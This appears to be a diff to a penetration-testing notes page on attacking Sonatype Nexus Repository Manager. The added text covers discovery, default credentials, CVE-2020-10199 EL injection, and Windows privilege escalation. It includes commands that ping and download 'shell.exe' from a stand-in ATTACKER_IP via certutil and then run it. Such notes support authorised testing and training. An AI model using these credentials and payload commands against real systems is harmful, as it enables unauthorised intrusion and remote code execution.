@@ -1,6 +1,6 @@
 # Sonatype Nexus Repository Manager
 
-Sonatype Nexus Repository Manager often exposes useful version details and REST endpoints before authentication. After admin access, Groovy scripting and scheduled tasks can lead to command execution.
+Sonatype Nexus Repository Manager often exposes useful version details and REST endpoints before authentication. Default credentials, low-privileged access, Groovy scripting, and older EL injection bugs can lead to command execution.
 
 ## Discovery
 
@@ -8,6 +8,7 @@ Sonatype Nexus Repository Manager often exposes useful version details and REST 
 curl -I http://TARGET:8081/
 curl http://TARGET:8081/robots.txt
 curl http://TARGET:8081/service/rest/swagger.json
+curl http://TARGET:8081/service/rest/v1/repositories
 ```
 
 Useful indicators:
@@ -24,6 +25,8 @@ Nuclei is useful for passive detection, but aggressive scans can make smaller Ne
 ```bash
 nuclei -target http://TARGET:8081 -rl 5 -c 3 -as
 ```
+
+The main page may disclose the exact version, for example `OSS 3.21.0-05`.
 
 ## REST Enumeration
 
@@ -59,6 +62,49 @@ Older installs may still use:
 
 ```text
 admin:admin123
+nexus:nexus
+```
+
+`nexus:nexus` is listed in SecLists default credentials:
+
+```bash
+grep -r -i 'Sonatype Nexus' /usr/share/seclists/Passwords/Default-Credentials
+```
+
+Check low-privileged logins too. CVE-2020-10199 style EL injection is post-authentication and may only require any valid user.
+
+## Authenticated EL Injection RCE
+
+Nexus Repository Manager versions up to and including 3.21.1 are affected by a post-authentication Java Expression Language injection. Any authenticated user may be enough.
+
+Metasploit module:
+
+```text
+exploit/linux/http/nexus_repo_manager_el_injection
+```
+
+Public PoC references:
+
+```text
+https://www.exploit-db.com/exploits/49385
+https://github.com/zhzyker/CVE-2020-10199_POC-EXP
+```
+
+For Windows targets, `cmd.exe` payloads are often more reliable than PowerShell one-liners through this path. Confirm blind command execution with ICMP first:
+
+```bash
+sudo tcpdump -i tun0 icmp
+```
+
+```cmd
+cmd.exe /c ping -n 4 ATTACKER_IP
+```
+
+If the PoC mangles Windows backslashes, URL-encode path separators:
+
+```bash
+CMD='cmd.exe /c certutil.exe -urlcache -f http://ATTACKER_IP:8000/shell.exe C:%2fWindows%2fTemp%2fshell.exe'
+CMD='cmd.exe /c C:%2fWindows%2fTemp%2fshell.exe'
 ```
 
 ## Authenticated Groovy RCE
@@ -108,6 +154,7 @@ Check the service account and install paths from the UI or shell:
 
 ```cmd
 whoami
+whoami /all
 set
 sc qc Nexus-Repository-Service
 dir C:\nexus\
@@ -115,4 +162,12 @@ dir C:\nexus\sonatype-work\nexus3\
 ```
 
 If the service binary or Nexus install directory is writable by low-privileged users, treat it as a Windows service-binary escalation path. See [Windows Privilege Escalation](../windows-priv-esc/win-priv-esc.md).
+
+Nexus may run from a user profile instead of a service-style install path:
+
+```text
+C:\Users\<user>\Nexus\nexus-3.x.x-xx\
+```
+
+If the process user has `SeImpersonatePrivilege`, pivot to Potato-style escalation. See [Windows Privilege Abuse](../windows-priv-esc/windows-privilege-abuse.md).
 
